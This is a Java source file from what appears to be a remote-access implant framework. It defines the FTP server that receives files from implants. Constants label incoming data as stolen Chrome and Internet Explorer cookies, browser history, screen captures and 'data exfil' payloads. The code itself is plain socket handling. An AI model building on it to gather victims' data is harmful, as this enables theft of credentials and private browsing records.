/**
 * ServerSocket to first handle new FTP Connections, interrogate the file coming in, and then decide if we automatically save to disk, or query user to save
 * 
 * @author Solomon Sonya
 */

package Implant.FTP;

import java.io.*;

import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;
import javax.swing.*;

import Implant.Driver;

import java.awt.*;

public class FTP_ServerSocket extends Thread implements Runnable
{
	String strMyClassName = "FTP_ServerSocket";
	
	FTP_Thread_Receiver receiverThread = null;
	
	InetAddress inetBindAddress = null;
	
	public static String FILE_TYPE_ORDINARY = "FILE_TYPE_ORDINARY";
	public static String FILE_TYPE_COOKIES_CHROME = "FILE_TYPE_COOKIES_CHROME";
	public static String FILE_TYPE_COOKIES_INTERNET_EXPLORER = "FILE_TYPE_COOKIES_IE";
	public static String FILE_TYPE_BROWSER_HISTORY_INTERNET_EXPLORER = "FILE_TYPE_BROWSER_HIST_IE";
	public static String FILE_TYPE_BROWSER_HISTORY_CHROME = "FILE_TYPE_BROWSER_HIST_CHROME";
	public static String FILE_TYPE_SCREEN_CAPTURES = "FILE_TYPE_SCREEN_CAPTURES";
	public static String FILE_TYPE_ORBITER_PAYLOAD = "FILE_TYPE_ORBITER_PAYLOAD"; // #####ETC#####FILE_TYPE_ORBITER_PAYLOAD#####ORBITING DIRECTORY NAME#####FILE TYPES BEING EXTRACTED
	public static String FILE_TYPE_DATA_EXFIL = "DATA_EXFIL";
	
	public boolean i_am_implant_daemon = false;
	public boolean i_am_controller_daemon = true;
	public static int PORT = 21;
	
	public InetAddress localhost = null;
	public static ServerSocket svrSocket = null;
	public String serverAddr ="";
	
	//Set max transferreble to be in chunks of 4k per loop
	public static final int maxFileReadSize_Bytes =  1024*4;
	
	public static String FTP_Server_Address = "";
	
	
	//Temporarily save connected senders
	Socket sktClient = null;
	
	
	public static volatile boolean continueRun = true;
	public static volatile boolean FTP_ServerSocket_Is_Open = false;
	
	public static JLabel jlblToIndicateStatus = null;
	
	public boolean dismissClosedSocketError = false;
	
	/**
	 * It is okay for inet_BindAddress to be null, if null, we will bind to the default interface on the machine. Otherwise, this specifies the interface to use for the internet server sockets
	 * @param i_am_implant_receiver
	 * @param i_am_controller_receiver
	 * @param prt
	 * @param inetBndAddress
	 * @param jlblToIndicateStats
	 */
	public FTP_ServerSocket(boolean i_am_implant_receiver, boolean i_am_controller_receiver, int prt, InetAddress inet_BindAddress, JLabel jlblToIndicateStats)
	{
		i_am_implant_daemon = i_am_implant_receiver;
		i_am_controller_daemon = i_am_controller_receiver;
		PORT = prt;
		jlblToIndicateStatus = jlblToIndicateStats;
		inetBindAddress = inet_BindAddress;
	}
	
	public void run()
	{
		try
		{
			//check data received
			if(i_am_implant_daemon == i_am_controller_daemon || PORT > 65534 || PORT < 1 || Driver.fleFTP_FileHiveDirectory == null || !Driver.fleFTP_FileHiveDirectory.exists() || !Driver.fleFTP_FileHiveDirectory.isDirectory() || (i_am_controller_daemon && jlblToIndicateStatus == null))
			{
				FTP_ServerSocket_Is_Open = false;
				continueRun = false;
				
				if(i_am_controller_daemon)
				{
					Driver.jop_Error("Invalid parameters passed in.  Unable to initiate FTP Server", "Can Not Run FTP Server");
				}
				
				Driver.sop("Invalid parameters passed in.  Unable to initiate FTP Server");
			}
			else
			{
				//data receivd was good!
				continueRun = true;
								
				//Create the server socket on the specified port.  Establish the server to listen on this port			
				if(inetBindAddress == null)
				{
					Driver.sop("NOTE: Network Interface was not specified. I will attempt to bind to the default network interface...");
					svrSocket = new ServerSocket(PORT);									
				}
				else
				{
					svrSocket = new ServerSocket(PORT, 0, inetBindAddress);
				}
				
				//Set the IP address
				//localhost = InetAddress.getLocalHost();
				localhost = svrSocket.getInetAddress();
												
				Driver.sop("FTP ServerSocket initialized.  Listening on Port: " + PORT);
				
				FTP_ServerSocket_Is_Open = true;
				
				//notify GUI if applicable
				if(jlblToIndicateStatus != null)
				{
					jlblToIndicateStatus.setText("" + PORT);
					
					jlblToIndicateStatus.setBackground(Color.green.darker());
					jlblToIndicateStatus.setForeground(Color.white);
					jlblToIndicateStatus.setToolTipText("" + localhost.toString());
				}							
				
			}
			
			/*********************
			 * 
			 * INFINITE WHILE
			 * 
			 ********************/
			
			String success = 	"\n* * * * * FTP ServerSocket Established at " +Driver.getTimeStamp_Without_Date() + " * * * * *\n" + 
					"Server HostName: " + localhost.getHostName() + "\n" + 
					//"Server IP: " + localhost.getHostAddress() + "\n" + 
					"Server IP: " + localhost + "\n" +
					"Listening for Files on Port: " + PORT;
			
			//FTP_Server_Address = localhost.getHostAddress();
			try
			{
				FTP_Server_Address = localhost.toString().substring(localhost.toString().indexOf("/") + 1);
			}
			catch(Exception e)
			{
				FTP_Server_Address = localhost.getHostAddress();
			}

			Driver.sop(success);

			Driver.jop_Message(success, "ServerSocket Established");
			
			String enabled = "ENABLED";
			if(!Driver.autoAcceptFTP_Files)
			{
				enabled = "DISABLED";
			}
			
			
			Driver.jop_Warning("NOTE: Auto Receiving of FTP files is currently " + enabled + "\nPlease remember to modify this option if applicable...",  "FTP Auto-Accept Files is " + enabled);
			
			while(continueRun)
			{
				sktClient = null;								
				
				//Forever wait until a new connection is established, once we have a new connection, spawn new Thread to handle each connected client
				sktClient = svrSocket.accept();
								
				
				//ensure we're still accepting connections
				if(!continueRun)
				{
					//close the socket and get out
					try
					{
						sktClient.close();
					}catch(Exception e){}
					
					break;
				}
				
				//OTherwise, we're still accepting connections, fall thru
				
				//Fall through once a new connection has been received
				receiverThread = new FTP_Thread_Receiver(i_am_implant_daemon, i_am_controller_daemon, sktClient);
				receiverThread.start();
				
				//Link Client for duration of transfer
				Driver.alConnectedFTPClients.add(receiverThread);
				
			}
			
			
			
		}
		
		catch(SocketException se)
		{
			if(dismissClosedSocketError)
			{
				Driver.sop("FTP ServerSocket has been closed." );
			}
			else
			{
				Driver.jop_Error("FTP ServerSocket is unable to bind to port " + PORT + ".\nPerhaps this port is occupied or has recently closed.                                \n\nPlease try a different port", "ServerSocket NOT ESTABLISHED - Unable to bind to port" + PORT);
				Driver.sop("Unable to bind to port " + PORT + ". FTP ServerSocket is Closed. You must try another port in order to continue");				
				
			}
			
		}
		
		catch(Exception e)
		{
			Driver.eop("run", strMyClassName, e, e.getLocalizedMessage(), false);
			
			
		}
		
		Driver.sop("HALTING FTP SERVER RECEIVER!!!");
		
		try
		{
			svrSocket.close();
		}catch(Exception e){}
		
		//we got out here, close the thread
		continueRun = false;
		FTP_ServerSocket_Is_Open = false;
		
		//notify GUI if applicable
		if(jlblToIndicateStatus != null)
		{
			jlblToIndicateStatus.setText("CLOSED");
			
			jlblToIndicateStatus.setBackground(Color.red);
			jlblToIndicateStatus.setForeground(Color.white);
			jlblToIndicateStatus.setToolTipText("");
		}
		
	}//END RUN MTD

}
